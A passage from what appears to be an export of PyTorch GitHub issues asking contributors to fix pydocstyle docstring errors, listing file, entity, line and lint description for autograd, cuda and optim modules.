- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `jacobian`, **Line**: 500, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `hessian`, **Line**: 714, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `hessian`, **Line**: 714, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/functional.py`, **Entity**: `vhp`, **Line**: 832, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: First line should end with a period (not 'r')
- **File**: `torch/autograd/functional.py`, **Entity**: `hvp`, **Line**: 925, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `profile`, **Line**: 19, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `profile`, **Line**: 19, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `self_cpu_time_total`, **Line**: 155, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/profiler_legacy.py`, **Entity**: `_get_record_key`, **Line**: 165, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `GradcheckError`, **Line**: 19, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `GradcheckError`, **Line**: 19, **Description**: First line should end with a period (not '`')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_numerical_jacobian`, **Line**: 192, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `get_numerical_jacobian`, **Line**: 229, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `_get_analytical_jacobian_forward_ad`, **Line**: 384, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradcheck`, **Line**: 1449, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradcheck`, **Line**: 1449, **Description**: First line should end with a period (not 'l')
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradgradcheck`, **Line**: 1606, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/gradcheck.py`, **Entity**: `gradgradcheck`, **Line**: 1606, **Description**: First line should end with a period (not 's')
- **File**: `torch/autograd/function.py`, **Entity**: `save_for_backward`, **Line**: 19, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/autograd/function.py`, **Entity**: `save_for_forward`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Save', not 'Saves')
- **File**: `torch/autograd/function.py`, **Entity**: `mark_dirty`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/function.py`, **Entity**: `mark_non_differentiable`, **Line**: 173, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/function.py`, **Entity**: `set_materialize_grads`, **Line**: 205, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/autograd/function.py`, **Entity**: `FunctionMeta`, **Line**: 282, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: First line should end with a period (not 's')
- **File**: `torch/autograd/function.py`, **Entity**: `forward`, **Line**: 299, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/function.py`, **Entity**: `backward`, **Line**: 360, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/function.py`, **Entity**: `jvp`, **Line**: 390, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `Function`, **Line**: 411, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `Function`, **Line**: 411, **Description**: First line should end with a period (not '`')
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: First line should end with a period (not 'h')
- **File**: `torch/autograd/function.py`, **Entity**: `vmap`, **Line**: 472, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/function.py`, **Entity**: `traceable`, **Line**: 562, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `EventList`, **Line**: 17, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `EventList`, **Line**: 17, **Description**: First line should end with a period (not ')')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_populate_cpu_children`, **Line**: 56, **Description**: First line should be in imperative mood (perhaps 'Populate', not 'Populates')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `table`, **Line**: 161, **Description**: First line should be in imperative mood (perhaps 'Print', not 'Prints')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `export_chrome_trace`, **Line**: 191, **Description**: First line should be in imperative mood (perhaps 'Export', not 'Exports')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time`, **Line**: 318, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time`, **Line**: 318, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time_share`, **Line**: 328, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_time_share`, **Line**: 328, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_memory`, **Line**: 335, **Description**: First line should end with a period (not 'g')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_format_memory`, **Line**: 335, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FormattedTimesMixin`, **Line**: 353, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FunctionEvent`, **Line**: 386, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `set_cpu_parent`, **Line**: 433, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `FunctionEventAvg`, **Line**: 536, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `MemRecordsAcc`, **Line**: 624, **Description**: First line should end with a period (not 'l')
- **File**: `torch/autograd/profiler_util.py`, **Entity**: `_build_table`, **Line**: 692, **Description**: First line should be in imperative mood (perhaps 'Print', not 'Prints')
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `no_grad`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `enable_grad`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `inference_mode`, **Line**: 173, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `inference_mode`, **Line**: 173, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/grad_mode.py`, **Entity**: `_unsafe_preserve_version_counter`, **Line**: 302, **Description**: First line should end with a period (not '!')

cc @carljparker",False
"Fix docstring errors in adagrad.py, asgd.py, sparse_adam.py, adam.py, adamax.py, grad_scaler.py, adamw.py, random.py, _functional.py, lbfgs.py, adadelta.py, __init__.py, autocast_mode.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state`, **Line**: 13, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state_all`, **Line**: 35, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/random.py`, **Entity**: `get_rng_state_all`, **Line**: 35, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state`, **Line**: 44, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Docstring is over-indented
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `set_rng_state_all`, **Line**: 69, **Description**: Section has no content ('Args')
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed_all`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `manual_seed_all`, **Line**: 100, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `seed`, **Line**: 118, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `seed`, **Line**: 118, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `seed_all`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/random.py`, **Entity**: `seed_all`, **Line**: 135, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/random.py`, **Entity**: `initial_seed`, **Line**: 155, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `autocast`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: First line should end with a period (not 'f')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_fwd`, **Line**: 75, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: First line should end with a period (not 'f')
- **File**: `torch/cuda/amp/autocast_mode.py`, **Entity**: `custom_bwd`, **Line**: 114, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `_MultiDeviceReplicator`, **Line**: 14, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `_MultiDeviceReplicator`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `step`, **Line**: 294, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `update`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Update', not 'Updates')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_scale`, **Line**: 449, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_factor`, **Line**: 461, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_factor`, **Line**: 461, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_factor`, **Line**: 467, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_factor`, **Line**: 467, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_backoff_factor`, **Line**: 474, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_backoff_factor`, **Line**: 474, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_backoff_factor`, **Line**: 480, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_backoff_factor`, **Line**: 480, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_interval`, **Line**: 487, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `get_growth_interval`, **Line**: 487, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_interval`, **Line**: 493, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `set_growth_interval`, **Line**: 493, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `is_enabled`, **Line**: 506, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `is_enabled`, **Line**: 506, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `state_dict`, **Line**: 512, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `state_dict`, **Line**: 512, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/amp/grad_scaler.py`, **Entity**: `load_state_dict`, **Line**: 534, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/optim/_functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/optim/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/lbfgs.py`, **Entity**: `LBFGS`, **Line**: 185, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/lbfgs.py`, **Entity**: `LBFGS`, **Line**: 185, **Description**: First line should end with a period (not 'c')
- **File**: `torch/optim/lbfgs.py`, **Entity**: `step`, **Line**: 285, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/sparse_adam.py`, **Entity**: `step`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adadelta.py`, **Entity**: `step`, **Line**: 79, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adadelta.py`, **Entity**: `adadelta`, **Line**: 188, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adagrad.py`, **Entity**: `step`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adagrad.py`, **Entity**: `adagrad`, **Line**: 201, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adam.py`, **Entity**: `step`, **Line**: 124, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adam.py`, **Entity**: `adam`, **Line**: 267, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adam.py`, **Entity**: `adam`, **Line**: 267, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/adamax.py`, **Entity**: `step`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adamax.py`, **Entity**: `adamax`, **Line**: 197, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adamw.py`, **Entity**: `step`, **Line**: 151, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adamw.py`, **Entity**: `adamw`, **Line**: 302, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/asgd.py`, **Entity**: `step`, **Line**: 98, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/asgd.py`, **Entity**: `asgd`, **Line**: 181, **Description**: No blank lines allowed after function docstring (found 1)

cc @carljparker",False
"Fix docstring errors in __init__.py, _memory_viz.py, streams.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_is_compiled`, **Line**: 107, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_available`, **Line**: 114, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_bf16_supported`, **Line**: 130, **Description**: First line should end with a period (not '6')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_bf16_supported`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_initialized`, **Line**: 196, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `init`, **Line**: 226, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `init`, **Line**: 226, **Description**: First line should end with a period (not 'l')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_device`, **Line**: 358, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_name`, **Line**: 373, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_capability`, **Line**: 388, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_properties`, **Line**: 405, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `can_device_access_peer`, **Line**: 421, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/__init__.py`, **Entity**: `can_device_access_peer`, **Line**: 421, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/__init__.py`, **Entity**: `StreamContext`, **Line**: 434, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: First line should end with a period (not 't')
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_stream`, **Line**: 497, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_stream`, **Line**: 497, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_strtoul`, **Line**: 517, **Description**: First line should end with a period (not ',')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: First line should end with a period (not 'L')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: First line should end with a period (not 'L')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_device_count_nvml`, **Line**: 636, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_device_count_nvml`, **Line**: 636, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_nvml_device_index`, **Line**: 665, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `device_count`, **Line**: 680, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_arch_list`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_gencode_flags`, **Line**: 696, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_device`, **Line**: 706, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `synchronize`, **Line**: 712, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_stream`, **Line**: 738, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `default_stream`, **Line**: 753, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_blas_handle`, **Line**: 768, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_blas_handle`, **Line**: 768, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_sync_debug_mode`, **Line**: 773, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_sync_debug_mode`, **Line**: 773, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_sync_debug_mode`, **Line**: 798, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_sync_debug_mode`, **Line**: 798, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: First line should end with a period (not 'r')
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `clock_rate`, **Line**: 886, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_generator`, **Line**: 916, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_set_rng_state_offset`, **Line**: 929, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_rng_state_offset`, **Line**: 945, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
